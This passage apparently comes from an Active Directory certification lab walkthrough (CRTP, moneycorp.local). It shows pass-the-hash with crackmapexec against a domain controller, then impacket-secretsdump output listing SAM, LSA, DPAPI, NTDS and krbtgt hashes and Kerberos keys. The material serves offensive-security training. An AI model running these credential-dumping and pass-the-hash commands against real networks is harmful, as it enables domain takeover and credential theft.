- EA access grants us access to all the child domains.
```
┌──(root💀0xDe4dBe3f)-[/home/…/AlteredSecurity/CRTP/LinuxAttack/dollarcorp.moneycorp.local]
└─# crackmapexec smb 172.16.9.1 -u Administrator -H 71d04f9d50ceb1f64de7a09f23e6dc4c -d moneycorp.local
SMB         172.16.9.1      445    US-DC            [*] Windows 10.0 Build 20348 x64 (name:US-DC) (domain:moneycorp.local) (signing:True) (SMBv1:False)
SMB         172.16.9.1      445    US-DC            [+] moneycorp.local\Administrator:71d04f9d50ceb1f64de7a09f23e6dc4c (🩸Blooded!🩸)
```

- Dump credentials from the DC.
```
┌──(root💀0xDe4dBe3f)-[/home/…/AlteredSecurity/CRTP/LinuxAttack/dollarcorp.moneycorp.local]
└─# impacket-secretsdump moneycorp.local/Administrator@172.16.9.1 -hashes :71d04f9d50ceb1f64de7a09f23e6dc4c
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation                                                                                                                                                                                   

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x26dc3415631ab97d4dac115ea43278b4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9bd2393bff452c6d1a2d755ac0feb6a1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
US\US-DC$:aes256-cts-hmac-sha1-96:4c3f150bec8d290ac389f4e4d71add033d59d69ba0191a8bcea96db48e6cb913
US\US-DC$:aes128-cts-hmac-sha1-96:07f9056dacd2a063bae943af124bb157
US\US-DC$:des-cbc-md5:3e8597c82f76cb62
US\US-DC$:plain_password_hex:0d9719608d9dcc48019fdd515e6570922664c4ac1265567e0e525679dfe64267bd766ce2cfbf61b0b746317b3a9a8f8038c75d13892c8d2dca4f20d7e17eda5fa90d8a7dd4d7899e8d565a38d1fe40c4ddfd86f7dc565f99f25d598ec06da06346a5c1c050dc19
cd1d149fbe6ae8e3f70d9fb4557b0520f4d4add07efc590d8b6557aa2b83052c764c84dbb6385f43c9016bf7b043f22cf87e97fd7f8129b23ed2b20e92edc40088042a696b5f4a9a55f562d108cc7529614cbe51cf902fc67b155f2827070888e1e91c815f5c4c679a5f2e2a3c6de670e0230ae242b
1639016e8bd4d51d635f067dd08a1546e355928
US\US-DC$:aad3b435b51404eeaad3b435b51404ee:87141b80ad9e065c1539b3dda25dce81:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0x880fb4974ad7b04e351c376e426a2549824ea8dc
dpapi_userkey:0xae0fd3fca4438f73b6a0bde6cb08e2b9edada611
[*] NL$KM 
 0000   21 55 A8 F7 64 DD 9A FA  80 95 0F 03 E8 E4 76 5E   !U..d.........v^
 0010   11 34 99 56 DE 62 E1 00  C6 FD 7D B8 14 AF 4F 73   .4.V.b....}...Os
 0020   58 C1 68 E3 16 E2 04 98  93 A5 39 C6 1B 7A E4 19   X.h.......9..z..
 0030   FE E6 EF DC 73 64 72 8C  F9 2A F2 5C 68 D2 DB 73   ....sdr..*.\h..s
NL$KM:2155a8f764dd9afa80950f03e8e4765e11349956de62e100c6fd7db814af4f7358c168e316e2049893a539c61b7ae419fee6efdc7364728cf92af25c68d2db73
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:507845679d4ddde58fe16c511a1b67c7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7397e9205669a3fce8462afcc6cd5b25:::
US-DC$:1000:aad3b435b51404eeaad3b435b51404ee:87141b80ad9e065c1539b3dda25dce81:::
dcorp$:1103:aad3b435b51404eeaad3b435b51404ee:28d60266dd551f84c7fa52cd66a67571:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:3642cdf269f6a6d320ce3338d52840ab241ed60ba7847cc6369b786a0f6a9751
Administrator:aes128-cts-hmac-sha1-96:3d1e60e7116fc39ff3a12d981d0d6bc4
Administrator:des-cbc-md5:7c0d23d9fd52944c

<snip>
```